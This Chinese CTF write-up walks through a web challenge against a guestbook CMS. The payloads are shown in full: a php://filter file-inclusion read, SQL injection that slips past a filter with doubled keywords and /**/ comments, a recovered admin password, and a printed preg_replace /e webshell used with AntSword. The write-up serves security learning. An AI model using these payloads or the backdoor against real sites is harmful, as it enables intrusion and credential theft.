打开网页，看到一个客户留言系统，仔细审查页面

## 1.看到留言 版，尝试xss,点击预览之后，页面提示，xss只是为了娱乐，换条思路



## 2.仔细阅读页面，发现一句类似提示的东西

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/AEF28CB38E894752B79273C14001664Cclipboard.png)

可能需要我们拿到shell，并且登陆到后台就知道了



## 3.查看网页源码，发现一个链接

view-source:http://cms.nuptzj.cn/about.php?file=sm.txt

打开看到sm.txt的内容，内容暴露了admin表结构，后面可能需要sql注入

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/785E941FD86C443D97D519B7204FCD6Aclipboard.png)

还暴露了，后台文件：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/A06285B0E17243B7A2B15881C0871C9Eclipboard.png)



## 4.?file=sm.txt可能存在文件包含

payload:http://cms.nuptzj.cn/about.php?file=index.php 发现页面显示了index.php源码

但是结构比较乱，可以尝试伪协议：

payload:http://cms.nuptzj.cn/about.php?file=php://filter/read=convert.base64-encode/resource=index.php

成功读出网页源码。

尝试读其他后台文件源码：

在尝试读取config.php文件时，页面提示，file参数不能为空，可能存在限制。



最后读出，index.php,passencode.php,say.php,文件内容，但是没有啥大发现。



后面发现about.php文件还没有查看，

payload:http://cms.nuptzj.cn/about.php?file=php://filter/read=convert.base64-encode/resource=about.php

读出about.php的源码，

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/45DAA21C179248EAB549918C68C565B6clipboard.png)

发现对config.php和loginxlcteam做了限制，loginxlcteam文件提示，敏感目录，禁止查看！但是...也许可以访问。



## 5.尝试访问：

http://cms.nuptzj.cn/loginxlcteam/

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/73831B36C78347DCB265860667CD6497clipboard.png)

看到后台页面，但是需要登陆，结合前面的表结构，可能需要注入，但是多次尝试也没有注入成功。



在这里卡了好一会儿，最后看了一下wp，发现index页面的搜索框还没有查看.......

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/3E8ED940966A429B9FC816057A061F26clipboard.png)



## 6.读出so.php文件源码

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/354AE68141534AADA90A69A2C2A5F04Fclipboard.png)

文件还限制了，必须使用Xlcteam Browser浏览器，此时只需将bp的http头改为：

User-Agent: Xlcteam Browser即可

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/252CB267DB9948C7890840CC18E5C922clipboard.png)

$id可能存在注入，但是经过了antinject.php的过滤，



## 7.所以查看antinject.php的源码，

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/0D63B0695A3C4A90B2342B6F7D5EB6F7clipboard.png)

发现该文件将关键字替换为了空。此处可以采用重写绕过，比如：seselectlect,空格可以使用/**/绕过



## 8.此时尝试sql注入

### 8.1采用union注入

### 8.2爆字段

payload:soid=1/**/uNunionion/**/seselectlect/**/null,null,null,null

此时页面和soid=1/**/uNunionion/**/seselectlect/**/null,null,null页面不一样，说明该查询返回四个字段

### 8.3查内容

此时已经知道了表结构，直接查询内容就可以了

payload:soid=1/**/uNunionion/**/seselectlect/**/null,(seselectlect/**/userpapassss/**/frfromom/**/admadminin),null,null



此时需要将soid=-100查询一个不存在的字段，使其报错，无法显示，才会显示union查询的内容。

返回：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/0DAFD078F87D41E98E516C0B80B9F82Aclipboard.png)

返回的字符，看起来向ascii码。



## 9.解ascii

```javascript
<?php
$str=array(102,117,99,107,114,117,110,116,117);
for($i=0;$i<count($str);$i++){
    echo chr($str[$i]);//fuckruntu
}
```



## 10.登陆后台

username=admin&userpass=fuckruntu

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/44BC205FDB4F4ADC8D3965C05D447AB4clipboard.png)



## 11.提示根目录存在xlcteam.php文件

刚才呢任意文件读取漏洞，刚好可以读取，根目录文件内容。

xlcteam.php

```javascript
<?php
$e = $_REQUEST['www'];
$arr = array($_POST['wtf'] => '|.*|e',);
array_walk($arr, $e, '');
?>

//payload:www=preg_replace
//将wtf接收的内容放到preg_replace里面执行
//此时wtf开启了preg_repalce的/e模式
```



## 12.蚁剑：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/cgctf/web/images/33D53ADE699345D6B47EAF54CD822348clipboard.png)







